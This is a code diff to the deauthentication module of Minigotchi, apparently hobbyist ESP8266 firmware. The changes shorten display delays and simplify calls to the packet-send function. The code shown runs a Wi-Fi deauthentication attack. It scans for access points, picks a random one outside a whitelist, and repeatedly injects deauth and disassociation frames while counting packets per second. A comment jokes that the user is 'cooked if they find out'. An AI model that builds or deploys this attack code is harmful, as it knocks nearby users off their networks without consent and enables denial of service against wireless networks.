@@ -64,7 +64,7 @@ void Deauth::list() {
     }
 }
 
-bool Deauth::send(uint8 *buf, int len, bool sys_seq) {
+bool Deauth::send(uint8_t* buf, uint16_t len, bool sys_seq) {
     bool sent = wifi_send_pkt_freedom(buf, len, sys_seq) == 0;
     delay(102);
 
@@ -112,20 +112,20 @@ void Deauth::select() {
         Serial.println("(0-o) Scanning for APs.");
         Display::cleanDisplayFace("(0-o)");
         Display::attachSmallText("Scanning  for APs.");
-        delay(500);
+        delay(250);
         Serial.println("(o-0) Scanning for APs..");
         Display::cleanDisplayFace("(o-0)");
         Display::attachSmallText("Scanning  for APs..");
-        delay(500);
+        delay(250);
         Serial.println("(0-o) Scanning for APs...");
         Display::cleanDisplayFace("(0-o)");
         Display::attachSmallText("Scanning  for APs...");
-        delay(500);
+        delay(250);
         Serial.println(" ");
-        delay(500);
+        delay(250);
     }
 
-    delay(1000);
+    delay(250);
 
     // stop and scan
     Minigotchi::monStop();
@@ -139,14 +139,14 @@ void Deauth::select() {
         Serial.println(" ");
         Display::cleanDisplayFace("(;-;)");
         Display::attachSmallText("You screwed up somehow!");
-        delay(1000);
+        delay(250);
     } else {
         // well ur fucked.
         Serial.println("(;-;) No access points found.");
         Serial.println(" ");
         Display::cleanDisplayFace("(;-;)");
         Display::attachSmallText("No access points found.");
-        delay(1000);
+        delay(250);
     }
 
     // check for ap in whitelist
@@ -161,7 +161,7 @@ void Deauth::select() {
     Serial.println(" ");
     Display::cleanDisplayFace("('-')");
     Display::attachSmallText("Selected random AP: " + (String) randomAP.c_str());
-    delay(1000);
+    delay(250);
         
     /** developer note:
      * 
@@ -267,7 +267,7 @@ void Deauth::select() {
     Display::cleanDisplayFace("('-')");
     Display::attachSmallText("AP Hidden?: " + (String) WiFi.isHidden(Deauth::randomIndex));
     Serial.println(" ");
-    delay(1000);
+    delay(250);
 }
 
 void Deauth::deauth() {
@@ -280,7 +280,7 @@ void Deauth::deauth() {
             Serial.println(" ");
             Display::cleanDisplayFace("(>-<)");
             Display::attachSmallText("Begin deauth-attack on AP...");
-            delay(1000);
+            delay(250);
             // define the attack
             if (!running) {
                 start();
@@ -289,7 +289,7 @@ void Deauth::deauth() {
                 Serial.println(" ");
                 Display::cleanDisplayFace("('-')");
                 Display::attachSmallText(" Attack is already running.");
-                delay(1000);
+                delay(250);
             }
         } else {
             // ok why did you modify the deauth function? i literally told you to not do that...
@@ -298,10 +298,10 @@ void Deauth::deauth() {
             Serial.println(" ");
             Display::cleanDisplayFace("(X-X)");
             Display::attachSmallText("No access point selected. Use select() first.");
-            delay(1000);
+            delay(250);
             Display::cleanDisplayFace("('-')");
             Display::attachSmallText("Told you so!");
-            delay(1000);
+            delay(250);
         }
     } else {
         // do nothing if deauthing is disabled
@@ -329,7 +329,7 @@ void Deauth::start() {
 
     // send the deauth 150 times(ur cooked if they find out)
     for (int i = 0; i < packetCount; ++i) {
-        if (Deauth::send(const_cast<uint8_t*>(deauthFrame), deauthFrameSize, 0) || Deauth::send(const_cast<uint8_t*>(disassociateFrame), disassociateFrameSize, 0)) {
+        if (Deauth::send(deauthFrame, deauthFrameSize, 0) || Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
             packets++;
             float pps = packets / (float)(millis() - startTime) * 1000;
 
@@ -341,15 +341,15 @@ void Deauth::start() {
                 Display::cleanDisplayFace("(>-<)");
                 Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s"); 
             } 
-        } else if (!Deauth::send(const_cast<uint8_t*>(deauthFrame), deauthFrameSize, 0) || !Deauth::send(const_cast<uint8_t*>(disassociateFrame), disassociateFrameSize, 0)){
+        } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) || !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
             Serial.println("(X-X) Both packets failed to send!");
             Display::cleanDisplayFace("(X-X)");
             Display::attachSmallText("Both packets failed to send!");
-        } else if (!Deauth::send(const_cast<uint8_t*>(deauthFrame), deauthFrameSize, 0) && Deauth::send(const_cast<uint8_t*>(disassociateFrame), disassociateFrameSize, 0)){
+        } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) && Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
             Serial.println("(X-X) Deauthentication failed to send!");
             Display::cleanDisplayFace("(X-X)");
             Display::attachSmallText("Deauth failed to send!");
-        } else if (Deauth::send(const_cast<uint8_t*>(deauthFrame), deauthFrameSize, 0) && !Deauth::send(const_cast<uint8_t*>(disassociateFrame), disassociateFrameSize, 0)){
+        } else if (Deauth::send(deauthFrame, deauthFrameSize, 0) && !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
             Serial.println("(X-X) Disassociation failed to send!");
             Display::cleanDisplayFace("(X-X)");
             Display::attachSmallText("Disassoc failed to send!");
